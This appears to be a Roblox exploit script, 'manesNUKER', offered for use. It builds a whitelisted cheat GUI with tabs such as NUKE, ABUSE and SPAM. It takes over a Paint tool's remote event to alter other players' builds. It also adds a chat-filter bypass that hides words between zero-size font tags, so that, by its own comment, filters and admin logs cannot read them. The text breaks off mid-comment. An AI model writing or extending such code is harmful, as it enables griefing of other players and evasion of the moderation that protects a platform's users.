--[[
  manesNUKER -- CodeX UI
  credit: stik claude gemini
]]

------------------------
-- WHITELIST
------------------------
local whitelistedIDs = {
    [10429099415] = "FLAMEFAML",
    [9693065023]  = "kupal_isme8",
    [4674698402]  = "warnmachine12908"
}
local Players = game:GetService("Players")
local player  = Players.LocalPlayer
if not whitelistedIDs[player.UserId] then
    player:Kick("Unauthorized: not whitelisted.")
    return
end

------------------------
-- SERVICES
------------------------
local UserInputService  = game:GetService("UserInputService")
local TweenService      = game:GetService("TweenService")
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService        = game:GetService("RunService")
local LocalPlayer       = player

if makefolder then pcall(function() makefolder("WindConfigs") end) end

------------------------
-- CLEANUP
------------------------
if player.PlayerGui:FindFirstChild("SimpleHub") then
    player.PlayerGui.SimpleHub:Destroy()
end

------------------------
-- GUI  (CodeX original structure)
------------------------
local gui = Instance.new("ScreenGui", player.PlayerGui)
gui.Name = "SimpleHub"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size             = UDim2.fromOffset(700, 560)
frame.Position         = UDim2.fromScale(0.5, 0.5)
frame.AnchorPoint      = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
frame.BorderSizePixel  = 0
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 25)

------------------------
-- TOGGLE BUTTON  (show/hide UI)
------------------------
local toggleBtn = Instance.new("TextButton", gui)
toggleBtn.Size             = UDim2.fromOffset(60, 60)
toggleBtn.Position         = UDim2.new(0, 20, 0.5, -30)
toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
toggleBtn.Text             = "M"
toggleBtn.Font             = Enum.Font.GothamBold
toggleBtn.TextSize         = 22
toggleBtn.TextColor3       = Color3.fromRGB(11, 95, 226)
toggleBtn.BorderSizePixel  = 0
toggleBtn.ZIndex           = 10
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1, 0)

-- Stroke ring
local toggleStroke = Instance.new("UIStroke", toggleBtn)
toggleStroke.Color     = Color3.fromRGB(11, 95, 226)
toggleStroke.Thickness = 2

-- Draggable toggle button
local tbDrag, tbDragStart, tbDragPos = false, nil, nil
toggleBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        tbDrag      = true
        tbDragStart = input.Position
        tbDragPos   = toggleBtn.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if tbDrag and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - tbDragStart
        toggleBtn.Position = UDim2.new(tbDragPos.X.Scale, tbDragPos.X.Offset + delta.X, tbDragPos.Y.Scale, tbDragPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        tbDrag = false
    end
end)

-- Click to toggle visibility
local uiVisible = true
toggleBtn.MouseButton1Click:Connect(function()
    uiVisible = not uiVisible
    TweenService:Create(frame, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Size = uiVisible and UDim2.fromOffset(600, 400) or UDim2.fromOffset(0, 0),
        BackgroundTransparency = uiVisible and 0 or 1
    }):Play()
    frame.Visible = uiVisible
    toggleBtn.Text             = uiVisible and "M" or "M"
    toggleBtn.BackgroundColor3 = uiVisible and Color3.fromRGB(30, 30, 50) or Color3.fromRGB(11, 70, 180)
    TweenService:Create(toggleStroke, TweenInfo.new(0.2), {
        Color = uiVisible and Color3.fromRGB(11, 95, 226) or Color3.fromRGB(200, 200, 255)
    }):Play()
end)

------------------------
-- LOADER  (CodeX original)
------------------------
local loaderOverlay = Instance.new("Frame", frame)
loaderOverlay.Size             = UDim2.fromScale(1, 1)
loaderOverlay.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
loaderOverlay.ZIndex           = 50
Instance.new("UICorner", loaderOverlay).CornerRadius = UDim.new(0, 25)

local loaderContainer = Instance.new("Frame", loaderOverlay)
loaderContainer.Size             = UDim2.fromOffset(120, 120)
loaderContainer.Position         = UDim2.fromScale(0.5, 0.5)
loaderContainer.AnchorPoint      = Vector2.new(0.5, 0.5)
loaderContainer.BackgroundTransparency = 1
loaderContainer.ZIndex           = 51

local loaderText = Instance.new("TextLabel", loaderOverlay)
loaderText.Size                   = UDim2.fromOffset(200, 40)
loaderText.Position               = UDim2.new(0.5, 0, 0.5, 70)
loaderText.AnchorPoint            = Vector2.new(0.5, 0)
loaderText.BackgroundTransparency = 1
loaderText.Text                   = ""
loaderText.Font                   = Enum.Font.GothamBold
loaderText.TextSize               = 28
loaderText.TextColor3             = Color3.fromRGB(11, 95, 226)
loaderText.ZIndex                 = 52

local squareSize  = 40
local grayColor   = Color3.fromRGB(150, 150, 150)
local blueColor   = Color3.fromRGB(11, 95, 226)
local spread      = 30
local finalOffsets = {
    Vector2.new(0, -squareSize/2), Vector2.new(squareSize/2, 0),
    Vector2.new(0, squareSize/2),  Vector2.new(-squareSize/2, 0),
}
local outOffsets = {
    Vector2.new(0, -spread), Vector2.new(spread, 0),
    Vector2.new(0, spread),  Vector2.new(-spread, 0),
}

local squares = {}
for i = 1, 4 do
    local sq = Instance.new("Frame", loaderContainer)
    sq.Size             = UDim2.fromOffset(squareSize, squareSize)
    sq.Position         = UDim2.new(0.5, -squareSize/2, 0.5, -squareSize/2)
    sq.BackgroundColor3 = blueColor
    sq.BorderSizePixel  = 0
    sq.Rotation         = 45
    sq.ZIndex           = 52
    Instance.new("UICorner", sq).CornerRadius = UDim.new(0, 4)
    squares[i] = sq
end

-- Diamond animation
task.spawn(function()
    local startTime = tick()
    while loaderOverlay.Parent and tick() - startTime < 5 do
        for i, sq in ipairs(squares) do
            TweenService:Create(sq, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Position         = UDim2.new(0.5, -squareSize/2 + outOffsets[i].X, 0.5, -squareSize/2 + outOffsets[i].Y),
                BackgroundColor3 = grayColor
            }):Play()
            task.wait(0.65)
            TweenService:Create(sq, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Position         = UDim2.new(0.5, -squareSize/2 + finalOffsets[i].X, 0.5, -squareSize/2 + finalOffsets[i].Y),
                BackgroundColor3 = blueColor
            }):Play()
            task.wait(0.65)
        end
    end
end)

-- Typewriter
task.spawn(function()
    local text = "manesNUKER"
    local speed = 0.12
    for i = 1, #text do
        loaderText.Text = string.sub(text, 1, i)
        task.wait(speed)
    end
end)

-- Remove loader after 5s
task.delay(5, function()
    TweenService:Create(loaderText, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
    for _, sq in ipairs(squares) do
        TweenService:Create(sq, TweenInfo.new(0.6), {
            Position         = UDim2.new(0, 0, 0, 0),
            Size             = UDim2.fromScale(1, 1),
            Rotation         = 0,
            BackgroundColor3 = frame.BackgroundColor3
        }):Play()
        sq:FindFirstChildOfClass("UICorner").CornerRadius = UDim.new(0, 25)
    end
    task.delay(0.65, function() loaderOverlay:Destroy() end)
end)

------------------------
-- DRAGGING  (CodeX original)
------------------------
local draggingHub   = false
local dragStart, startPos
local ignoreHubDrag = false

local function updateHubDrag(input)
    if draggingHub and not ignoreHubDrag then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingHub = true
        dragStart   = input.Position
        startPos    = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then draggingHub = false end
        end)
    end
end)
frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        updateHubDrag(input)
    end
end)

------------------------
-- PAGE SYSTEM - LEFT SIDEBAR TABS (no arrows)
------------------------
local pages       = {"NUKE","FIX","SLOTS","AURA","BKIT","SPAM","ANTI","SCRIPTS","DONATE","ABUSE","SAVE ENLI","AUTO BUILD","TOOLS","CREDITS"}
local currentPage = 1

-- LEFT SIDEBAR
local sidebar = Instance.new("Frame", frame)
sidebar.Size             = UDim2.new(0,112,1,0)
sidebar.Position         = UDim2.fromOffset(0,0)
sidebar.BackgroundColor3 = Color3.fromRGB(18,18,32)
sidebar.BorderSizePixel  = 0
Instance.new("UICorner", sidebar).CornerRadius = UDim.new(0,25)
-- clip right corners straight
local sideClip = Instance.new("Frame", sidebar)
sideClip.Size             = UDim2.new(0,25,1,0)
sideClip.Position         = UDim2.new(1,-25,0,0)
sideClip.BackgroundColor3 = Color3.fromRGB(18,18,32)
sideClip.BorderSizePixel  = 0

local sideScroll = Instance.new("ScrollingFrame", sidebar)
sideScroll.Size                = UDim2.new(1,0,1,-8)
sideScroll.Position            = UDim2.fromOffset(0,4)
sideScroll.BackgroundTransparency = 1
sideScroll.BorderSizePixel     = 0
sideScroll.ScrollBarThickness  = 2
sideScroll.ScrollBarImageColor3 = Color3.fromRGB(60,60,100)
sideScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
sideScroll.CanvasSize          = UDim2.new(0,0,0,0)
local sideLayout = Instance.new("UIListLayout", sideScroll)
sideLayout.Padding             = UDim.new(0,3)
sideLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
local sidePad = Instance.new("UIPadding", sideScroll)
sidePad.PaddingTop = UDim.new(0,6)

local sideTabBtns = {}
local leftArrow = {} -- stub so addArrowHover doesn't crash
local rightArrow = {}

-- LOGS: simple print override (no visible panel, saves space)
local oldPrint = print
print = function(...)
    local args = {...}
    local msg = ""
    for i,v in ipairs(args) do msg = msg..tostring(v).."\t" end
    oldPrint(msg)
end

------------------------
-- HELPERS  (CodeX original style)
------------------------
local function tweenProperty(obj, prop, to, duration)
    TweenService:Create(obj, TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {[prop] = to}):Play()
end

-- Content width (fits left of logs panel)
local CW = 520

local function createButton(parent, text, func, w, h)
    w = w or CW; h = h or 40
    local btn = Instance.new("TextButton", parent)
    btn.Size             = UDim2.fromOffset(w, h)
    btn.Text             = text
    btn.Font             = Enum.Font.Gotham
    btn.TextSize         = 18
    btn.TextColor3       = Color3.fromRGB(116, 113, 117)
    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
    btn.BorderSizePixel  = 0
    btn.AutoButtonColor  = false
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
    local originalSize = btn.Size
    btn.MouseEnter:Connect(function()
        tweenProperty(btn, "TextColor3", Color3.fromRGB(11, 95, 226), 0.3)
        tweenProperty(btn, "Size", UDim2.new(originalSize.X.Scale, originalSize.X.Offset + 10, originalSize.Y.Scale, originalSize.Y.Offset + 5), 0.2)
    end)
    btn.MouseLeave:Connect(function()
        tweenProperty(btn, "TextColor3", Color3.fromRGB(116, 113, 117), 0.3)
        tweenProperty(btn, "Size", originalSize, 0.2)
    end)
    btn.MouseButton1Click:Connect(func)
    return btn
end

local function createToggle(parent, text, func, w, h)
    w = w or CW; h = h or 40
    local state  = false
    local toggle = Instance.new("TextButton", parent)
    toggle.Size             = UDim2.fromOffset(w, h)
    toggle.Text             = text .. ": OFF"
    toggle.Font             = Enum.Font.Gotham
    toggle.TextSize         = 18
    toggle.TextColor3       = Color3.fromRGB(116, 113, 117)
    toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
    toggle.BorderSizePixel  = 0
    toggle.AutoButtonColor  = false
    Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 12)
    local originalSize = toggle.Size
    toggle.MouseEnter:Connect(function()
        tweenProperty(toggle, "TextColor3", Color3.fromRGB(11, 95, 226), 0.3)
        tweenProperty(toggle, "Size", UDim2.new(originalSize.X.Scale, originalSize.X.Offset + 10, originalSize.Y.Scale, originalSize.Y.Offset + 5), 0.2)
    end)
    toggle.MouseLeave:Connect(function()
        tweenProperty(toggle, "TextColor3", Color3.fromRGB(116, 113, 117), 0.3)
        tweenProperty(toggle, "Size", originalSize, 0.2)
    end)
    toggle.MouseButton1Click:Connect(function()
        state = not state
        toggle.Text = text .. (state and ": ON" or ": OFF")
        tweenProperty(toggle, "BackgroundColor3", state and Color3.fromRGB(11, 70, 180) or Color3.fromRGB(50, 50, 70), 0.2)
        func(state)
    end)
    return toggle
end

local function createSlider(parent, text, minV, maxV, defV, onChange, w)
    w = w or CW
    local holder = Instance.new("Frame", parent)
    holder.Size             = UDim2.fromOffset(w, 60)
    holder.BackgroundTransparency = 1

    local label = Instance.new("TextLabel", holder)
    label.Size                   = UDim2.fromOffset(w, 20)
    label.Position               = UDim2.fromOffset(0, 0)
    label.BackgroundTransparency = 1
    label.Font                   = Enum.Font.Gotham
    label.TextSize               = 18
    label.TextColor3             = Color3.fromRGB(116, 113, 117)
    label.Text                   = text .. ": " .. tostring(defV)

    local track = Instance.new("Frame", holder)
    track.Size             = UDim2.fromOffset(w - 40, 6)
    track.Position         = UDim2.fromOffset(20, 35)
    track.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

    local fill = Instance.new("Frame", track)
    fill.Size             = UDim2.new((defV - minV)/(maxV - minV), 0, 1, 0)
    fill.BackgroundColor3 = blueColor
    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)

    local knob = Instance.new("Frame", track)
    knob.Size        = UDim2.fromOffset(14, 14)
    knob.Position    = UDim2.new((defV - minV)/(maxV - minV), 0, 0.5, 0)
    knob.AnchorPoint = Vector2.new(0.5, 0.5)
    knob.BackgroundColor3 = blueColor
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

    local knobOrigSize = knob.Size
    local draggingKnob = false

    knob.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            draggingKnob  = true
            ignoreHubDrag = true
            tweenProperty(knob, "Size", UDim2.new(knobOrigSize.X.Scale, knobOrigSize.X.Offset + 8, knobOrigSize.Y.Scale, knobOrigSize.Y.Offset + 8), 0.1)
        end
    end)
    knob.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            draggingKnob  = false
            ignoreHubDrag = false
            tweenProperty(knob, "Size", knobOrigSize, 0.2)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if draggingKnob and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local x = math.clamp((input.Position.X - track.AbsolutePosition.X) / track.AbsoluteSize.X, 0, 1)
            knob.Position = UDim2.new(x, 0, 0.5, 0)
            fill.Size     = UDim2.new(x, 0, 1, 0)
            local val     = math.floor(minV + (maxV - minV) * x)
            label.Text    = text .. ": " .. tostring(val)
            if onChange then onChange(val) end
        end
    end)
    return holder
end

local function createLabel(parent, text, col, sz, w, h)
    local lbl = Instance.new("TextLabel", parent)
    lbl.Size                   = UDim2.fromOffset(w or CW, h or 22)
    lbl.BackgroundTransparency = 1
    lbl.Text                   = text
    lbl.Font                   = Enum.Font.Gotham
    lbl.TextSize               = sz or 14
    lbl.TextColor3             = col or Color3.fromRGB(116, 113, 117)
    lbl.TextXAlignment         = Enum.TextXAlignment.Left
    lbl.TextWrapped            = true
    return lbl
end

-- createTextBox: shows the function label on left, input field on right
local function createTextBox(parent, labelText, w, h)
    w = w or CW; h = h or 36
    local wrap = Instance.new("Frame", parent)
    wrap.Size             = UDim2.fromOffset(w, h)
    wrap.BackgroundColor3 = Color3.fromRGB(28,28,48)
    wrap.BorderSizePixel  = 0
    Instance.new("UICorner", wrap).CornerRadius = UDim.new(0,8)
    -- label (left 55%)
    local lbl = Instance.new("TextLabel", wrap)
    lbl.Size             = UDim2.new(0.56,0,1,0)
    lbl.Position         = UDim2.fromOffset(8,0)
    lbl.BackgroundTransparency = 1
    lbl.Text             = labelText
    lbl.Font             = Enum.Font.Gotham
    lbl.TextSize         = 11
    lbl.TextColor3       = Color3.fromRGB(160,160,185)
    lbl.TextXAlignment   = Enum.TextXAlignment.Left
    lbl.TextWrapped      = true
    -- input (right 42%)
    local box = Instance.new("TextBox", wrap)
    box.Size             = UDim2.new(0.40,0,1,-6)
    box.Position         = UDim2.new(0.58,0,0,3)
    box.PlaceholderText  = "enter..."
    box.Text             = ""
    box.BackgroundColor3 = Color3.fromRGB(40,40,62)
    box.TextColor3       = Color3.fromRGB(220,220,240)
    box.PlaceholderColor3= Color3.fromRGB(90,90,120)
    box.Font             = Enum.Font.Gotham
    box.TextSize         = 12
    box.BorderSizePixel  = 0
    box.ClearTextOnFocus = false
    Instance.new("UICorner", box).CornerRadius = UDim.new(0,6)
    return box
end

local function createDivider(parent)
    local d = Instance.new("Frame", parent)
    d.Size             = UDim2.fromOffset(CW, 1)
    d.BackgroundColor3 = Color3.fromRGB(55, 55, 75)
    d.BorderSizePixel  = 0
    return d
end

-- arrow hover removed (sidebar tabs used instead)

-- Page scroll containers -- positioned in CodeX content area (x=20, y=68)
local pageContainers = {}
for i = 1, #pages do
    local sf = Instance.new("ScrollingFrame", frame)
    sf.Size                  = UDim2.fromOffset(572, 548)
    sf.Position              = UDim2.fromOffset(120, 4)
    sf.BackgroundTransparency = 1
    sf.BorderSizePixel       = 0
    sf.ScrollBarThickness    = 3
    sf.ScrollBarImageColor3  = blueColor
    sf.CanvasSize            = UDim2.new(0, 0, 0, 0)
    sf.AutomaticCanvasSize   = Enum.AutomaticSize.Y
    sf.Visible               = false
    local ul = Instance.new("UIListLayout", sf)
    ul.Padding             = UDim.new(0, 6)
    ul.HorizontalAlignment = Enum.HorizontalAlignment.Left
    local upad = Instance.new("UIPadding", sf)
    upad.PaddingLeft = UDim.new(0, 4)
    upad.PaddingTop  = UDim.new(0, 4)
    pageContainers[i] = sf
end

-- Sidebar tab switching
local function updatePage()
    for i, c in ipairs(pageContainers) do c.Visible = (i == currentPage) end
    for i, btn in ipairs(sideTabBtns) do
        if i == currentPage then
            btn.BackgroundColor3 = blueColor
            btn.TextColor3       = Color3.new(1,1,1)
        else
            btn.BackgroundColor3 = Color3.fromRGB(28,28,46)
            btn.TextColor3       = Color3.fromRGB(140,140,165)
        end
    end
end

-- Build sidebar tab buttons after pageContainers exist
for i, name in ipairs(pages) do
    local btn = Instance.new("TextButton", sideScroll)
    btn.Size             = UDim2.fromOffset(104, 34)
    btn.BackgroundColor3 = Color3.fromRGB(28,28,46)
    btn.Text             = name
    btn.Font             = Enum.Font.GothamBold
    btn.TextSize         = 9
    btn.TextColor3       = Color3.fromRGB(140,140,165)
    btn.BorderSizePixel  = 0
    btn.AutoButtonColor  = false
    btn.TextWrapped      = true
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,7)
    btn.MouseButton1Click:Connect(function()
        currentPage = i
        updatePage()
    end)
    sideTabBtns[i] = btn
end

-- Shorthand refs
local pgNuke    = pageContainers[1]
local pgFix     = pageContainers[2]
local pgSlots   = pageContainers[3]
local pgAura    = pageContainers[4]
local pgBkit    = pageContainers[5]
local pgSpam    = pageContainers[6]
local pgAnti    = pageContainers[7]
local pgAutoBuild = pageContainers[12]
local pgTools     = pageContainers[13]
local pgCredits   = pageContainers[14]
local pgSaveEnli  = pageContainers[11]
local pgScripts = pageContainers[8]
local pgDonate  = pageContainers[9]
local pgAbuse   = pageContainers[10]

-- ============================================================
-- COLOR PICKER
-- ============================================================
local PickerOverlay = Instance.new("Frame", gui)
PickerOverlay.Size                    = UDim2.fromScale(1, 1)
PickerOverlay.BackgroundColor3        = Color3.new(0, 0, 0)
PickerOverlay.BackgroundTransparency  = 0.55
PickerOverlay.Visible                 = false
PickerOverlay.Active                  = true
PickerOverlay.ZIndex                  = 100

local PickerBox = Instance.new("Frame", PickerOverlay)
PickerBox.Size             = UDim2.fromOffset(240, 310)
PickerBox.Position         = UDim2.fromScale(0.5, 0.5)
PickerBox.AnchorPoint      = Vector2.new(0.5, 0.5)
PickerBox.BackgroundColor3 = Color3.fromRGB(28, 28, 44)
PickerBox.BorderSizePixel  = 0
PickerBox.ZIndex           = 101
Instance.new("UICorner", PickerBox).CornerRadius = UDim.new(0, 14)

local PKTop = Instance.new("Frame", PickerBox)
PKTop.Size = UDim2.fromOffset(240, 3); PKTop.BackgroundColor3 = blueColor; PKTop.BorderSizePixel = 0
Instance.new("UICorner", PKTop).CornerRadius = UDim.new(0, 14)

local PKTitle = Instance.new("TextLabel", PickerBox)
PKTitle.Size=UDim2.fromOffset(240,28); PKTitle.Position=UDim2.fromOffset(0,6)
PKTitle.Text="Color Picker"; PKTitle.Font=Enum.Font.GothamBold; PKTitle.TextSize=14
PKTitle.TextColor3=Color3.fromRGB(200,200,220); PKTitle.BackgroundTransparency=1; PKTitle.ZIndex=102

local SVSq = Instance.new("ImageLabel", PickerBox)
SVSq.Size=UDim2.fromOffset(210,150); SVSq.Position=UDim2.fromOffset(15,36)
SVSq.BackgroundColor3=Color3.fromHSV(0,1,1); SVSq.BorderSizePixel=0; SVSq.ZIndex=102
Instance.new("UICorner",SVSq).CornerRadius=UDim.new(0,5)
local svGH=Instance.new("UIGradient",SVSq)
svGH.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.new(1,1,1)),ColorSequenceKeypoint.new(1,Color3.new(1,1,1))})
svGH.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)}); svGH.Rotation=90
local SVDk=Instance.new("Frame",SVSq)
SVDk.Size=UDim2.fromScale(1,1); SVDk.BackgroundColor3=Color3.new(0,0,0); SVDk.BorderSizePixel=0; SVDk.ZIndex=103
Instance.new("UICorner",SVDk).CornerRadius=UDim.new(0,5)
local svGV=Instance.new("UIGradient",SVDk)
svGV.Color=ColorSequence.new(Color3.new(0,0,0))
svGV.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,1),NumberSequenceKeypoint.new(1,0)})
local SVDot=Instance.new("Frame",SVSq)
SVDot.Size=UDim2.fromOffset(12,12); SVDot.AnchorPoint=Vector2.new(0.5,0.5)
SVDot.Position=UDim2.new(1,0,0,0); SVDot.BackgroundColor3=Color3.new(1,1,1)
SVDot.BorderSizePixel=2; SVDot.BorderColor3=Color3.new(0,0,0); SVDot.ZIndex=105
Instance.new("UICorner",SVDot).CornerRadius=UDim.new(1,0)

local HueBar=Instance.new("ImageLabel",PickerBox)
HueBar.Size=UDim2.fromOffset(210,18); HueBar.Position=UDim2.fromOffset(15,196)
HueBar.BackgroundColor3=Color3.new(1,1,1); HueBar.BorderSizePixel=0; HueBar.ZIndex=102
Instance.new("UICorner",HueBar).CornerRadius=UDim.new(0,5)
local hG=Instance.new("UIGradient",HueBar)
hG.Color=ColorSequence.new({
    ColorSequenceKeypoint.new(0,   Color3.fromHSV(0,   1,1)),
    ColorSequenceKeypoint.new(1/6, Color3.fromHSV(1/6, 1,1)),
    ColorSequenceKeypoint.new(2/6, Color3.fromHSV(2/6, 1,1)),
    ColorSequenceKeypoint.new(3/6, Color3.fromHSV(3/6, 1,1)),
    ColorSequenceKeypoint.new(4/6, Color3.fromHSV(4/6, 1,1)),
    ColorSequenceKeypoint.new(5/6, Color3.fromHSV(5/6, 1,1)),
    ColorSequenceKeypoint.new(1,   Color3.fromHSV(1,   1,1)),
}); hG.Rotation=90
local HueCur=Instance.new("Frame",HueBar)
HueCur.Size=UDim2.fromOffset(4,22); HueCur.AnchorPoint=Vector2.new(0.5,0.5)
HueCur.Position=UDim2.new(0,0,0.5,0); HueCur.BackgroundColor3=Color3.new(1,1,1)
HueCur.BorderSizePixel=1; HueCur.BorderColor3=Color3.new(0,0,0); HueCur.ZIndex=104
Instance.new("UICorner",HueCur).CornerRadius=UDim.new(0,2)

local HexBox=Instance.new("TextBox",PickerBox)
HexBox.Size=UDim2.fromOffset(210,30); HexBox.Position=UDim2.fromOffset(15,224)
HexBox.BackgroundColor3=Color3.fromRGB(38,38,58); HexBox.TextColor3=Color3.fromRGB(220,220,240)
HexBox.Font=Enum.Font.Code; HexBox.TextSize=13; HexBox.Text="FF0000"
HexBox.PlaceholderText="RRGGBB"; HexBox.BorderSizePixel=0; HexBox.ZIndex=102
Instance.new("UICorner",HexBox).CornerRadius=UDim.new(0,7)

local SwPrev=Instance.new("Frame",PickerBox)
SwPrev.Size=UDim2.fromOffset(210,22); SwPrev.Position=UDim2.fromOffset(15,264)
SwPrev.BackgroundColor3=Color3.fromRGB(255,0,0); SwPrev.BorderSizePixel=0; SwPrev.ZIndex=102
Instance.new("UICorner",SwPrev).CornerRadius=UDim.new(0,5)

local PKConf=Instance.new("TextButton",PickerBox)
PKConf.Size=UDim2.fromOffset(210,32); PKConf.Position=UDim2.fromOffset(15,272)
PKConf.BackgroundColor3=blueColor; PKConf.Text="CONFIRM"
PKConf.Font=Enum.Font.GothamBold; PKConf.TextSize=14; PKConf.TextColor3=Color3.new(1,1,1)
PKConf.BorderSizePixel=0; PKConf.ZIndex=102
Instance.new("UICorner",PKConf).CornerRadius=UDim.new(0,8)
PKConf.MouseButton1Click:Connect(function() PickerOverlay.Visible=false end)

local curPB=nil; local pH,pS,pV=0,1,1
local function toHex(c) return string.format("%02X%02X%02X",math.round(c.R*255),math.round(c.G*255),math.round(c.B*255)) end
local function updatePicker()
    SVSq.BackgroundColor3=Color3.fromHSV(pH,1,1)
    SVDot.Position=UDim2.new(pS,0,1-pV,0); HueCur.Position=UDim2.new(pH,0,0.5,0)
    local c=Color3.fromHSV(pH,pS,pV)
    if curPB then curPB.BackgroundColor3=c end
    SwPrev.BackgroundColor3=c; HexBox.Text=toHex(c)
end
local svDrag,hueDrag=false,false
local function svIn(i)
    pS=math.clamp((i.Position.X-SVSq.AbsolutePosition.X)/SVSq.AbsoluteSize.X,0,1)
    pV=1-math.clamp((i.Position.Y-SVSq.AbsolutePosition.Y)/SVSq.AbsoluteSize.Y,0,1); updatePicker()
end
local function hueIn(i)
    pH=math.clamp((i.Position.X-HueBar.AbsolutePosition.X)/HueBar.AbsoluteSize.X,0,1); updatePicker()
end
for _, el in ipairs({SVSq,SVDk}) do
    el.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then svDrag=true;svIn(i) end end)
end
HueBar.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then hueDrag=true;hueIn(i) end end)
UserInputService.InputChanged:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then
        if svDrag then svIn(i) end; if hueDrag then hueIn(i) end
    end
end)
UserInputService.InputEnded:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then svDrag=false;hueDrag=false end
end)
HexBox.FocusLost:Connect(function()
    local h=HexBox.Text:gsub("#",""):upper()
    if #h==6 then
        local r=tonumber("0x"..h:sub(1,2)); local g=tonumber("0x"..h:sub(3,4)); local b=tonumber("0x"..h:sub(5,6))
        if r and g and b then local hv,sv,vv=Color3.toHSV(Color3.fromRGB(r,g,b)); pH,pS,pV=hv,sv,vv; updatePicker() end
    end
end)
local function openPicker(btn)
    curPB=btn; local h,s,v=Color3.toHSV(btn.BackgroundColor3); pH,pS,pV=h,s,v; updatePicker()
    PickerOverlay.Visible=true
end

-- ============================================================
-- CORE NUKE / FIX LOGIC
-- ============================================================
local faces     = {"Front","Back","Top","Bottom","Right","Left"}
local faceEnums = {
    Front=Enum.NormalId.Front, Back=Enum.NormalId.Back, Top=Enum.NormalId.Top,
    Bottom=Enum.NormalId.Bottom, Right=Enum.NormalId.Right, Left=Enum.NormalId.Left,
}
local faceData   = {}
local LIGHT_GRAY = Color3.fromRGB(200, 200, 200)

local function getPaintRemote()
    local char=LocalPlayer.Character; if not char then return nil,nil end
    local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return nil,nil end
    local tool=char:FindFirstChild("Paint") or LocalPlayer.Backpack:FindFirstChild("Paint")
    if not tool then return nil,nil end
    if tool.Parent~=char then
        local hum=char:FindFirstChildOfClass("Humanoid")
        if hum then hum:EquipTool(tool); task.wait(0.25) end
        tool=char:FindFirstChild("Paint") or LocalPlayer.Backpack:FindFirstChild("Paint")
        if not tool then return nil,nil end
    end
    local remote=tool:FindFirstChild("Event",true) or tool:FindFirstChildWhichIsA("RemoteEvent",true)
    return remote, hrp.Position
end
local function getBrick() return ReplicatedStorage:FindFirstChild("Brick") end

-- ============================================================
-- BYPASS TEXT -- inserts <font size='0'></font> between every letter
-- so chat filters / admin logs can't read the words
-- ============================================================
local BP          = "<font size='0'></font>"
local TextService = game:GetService("TextService")

-- Check if text would be filtered by Roblox (returns ### tags)
local function isFiltered(text)
    local ok, result = pcall(function()
        local f = TextService:FilterStringAsync(text, LocalPlayer.UserId)
        return f:GetNonChatStringForBroadcastAsync()
    end)
    if not ok then return false end
    return result:find("#") ~= nil
end

-- Build a bypass attempt with a given chunk size (bigger = fewer tags = less visible)
local function buildBypass(str, minChunk, maxChunk)
    local result = ""
    local i = 1
    while i <= #str do
        local chunk = math.random(minChunk, maxChunk)
        result = result .. str:sub(i, i + chunk - 1)
        i = i + chunk
        if i <= #str then result = result .. BP end
    end
    return result
end

-- Smart bypass:
-- 1. If Roblox doesn't filter the text at all -> return as-is (no tags)
